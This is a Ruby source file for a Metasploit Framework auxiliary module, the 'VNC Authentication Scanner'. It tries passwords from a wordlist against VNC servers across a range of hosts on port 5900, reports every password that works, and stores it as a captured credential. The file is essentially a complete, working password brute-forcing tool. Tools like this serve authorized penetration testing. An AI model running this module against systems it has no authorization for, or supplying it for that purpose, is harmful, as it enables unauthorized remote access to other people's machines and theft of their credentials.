##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex/proto/rfb'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	def initialize
		super(
			'Name'        => 'VNC Authentication Scanner',
			'Version'     => '$Revision$',
			'Description' => %q{
					This module will test a VNC server on a range of machines and
				report successful logins. Currently it supports RFB protocol
				version 3.3, 3.7, and 3.8 using the VNC challenge response
				authentication method.
			},
			'Author'      =>
				[
					'carstein <carstein.sec [at] gmail [dot] com>',
					'jduck'
				],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(5900),
				OptString.new('PASSWORD', [ false, 'The password to test' ]),
				OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
					File.join(Msf::Config.data_directory, "wordlists", "vnc_passwords.txt") ]),
			], self.class)
	end

	def run_host(ip)
		print_status("#{ip}:#{rport} - Starting VNC login sweep")

		begin
			each_user_pass { |user, pass|
				do_login(user, pass)
			}
		rescue ::Rex::ConnectionError
			nil
		end
	end

	def do_login(user, pass)
		vprint_status("#{target_host}:#{rport} - Attempting VNC login with password '#{pass}'")

		connect

		begin
			vnc = Rex::Proto::RFB::Client.new(sock, :allow_none => false)
			if not vnc.handshake
				vprint_error("#{target_host}:#{rport}, #{vnc.error}")
				return :abort
			end

			ver = "#{vnc.majver}.#{vnc.minver}"
			vprint_status("#{target_host}:#{rport}, VNC server protocol version : #{ver}")
			report_service(
				:host => rhost,
				:port => rport,
				:proto => 'tcp',
				:name => 'vnc',
				:info => "VNC protocol version #{ver}"
			)

			if not vnc.authenticate(pass)
				vprint_error("#{target_host}:#{rport}, #{vnc.error}")
				return :next_user
			end

			print_good("#{target_host}:#{rport}, VNC server password : \"#{pass}\"")

			access_type = "password"
			#access_type = "view-only password" if vnc.view_only_mode
			report_auth_info({
				:host => rhost,
				:port => rport,
				:sname => 'vnc',
				:pass => pass,
				:type => access_type,
				:active => "true",
			})
			return :next_user

		# For debugging only.
		#rescue ::Exception
		#	print_error("#{$!}")

		ensure
			disconnect()
		end
	end

end
